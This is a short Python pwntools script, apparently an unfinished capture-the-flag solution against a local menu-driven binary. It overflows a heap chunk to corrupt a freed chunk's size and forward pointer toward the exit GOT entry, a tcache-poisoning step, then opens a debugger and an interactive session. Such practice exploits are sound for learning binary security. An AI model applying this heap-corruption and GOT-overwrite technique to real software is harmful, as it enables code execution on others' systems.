from pwn import *

exe = ('./soal')
elf = context.binary = ELF(exe, checksec=False)
#context.terminal = ['tmux', 'splitw', '-h']
libc = './libc.so.6'
io = process(exe)


def request(idx, size):
    io.sendlineafter(b':', b'1')
    io.sendlineafter(b':', str(idx).encode())
    io.sendlineafter(b':', str(size).encode())

def fill(idx, content):
    io.sendlineafter(b':', b'2')
    io.sendlineafter(b':', str(idx).encode())
    io.sendafter(b':', content)

def view(idx):
    io.sendlineafter(b':', b'3')
    io.sendlineafter(b':', str(idx).encode())

def remove(idx):
    io.sendlineafter(b':', b'4')
    io.sendlineafter(b':', str(idx).encode())

request(0, 0x48)
request(1, 0x50)
request(2, 0x50)

gdb.attach(io)

remove(2)
remove(1)

fill(0, b'A'*(0x48) + p64(0x61) + p64(elf.got['exit']))
io.interactive()
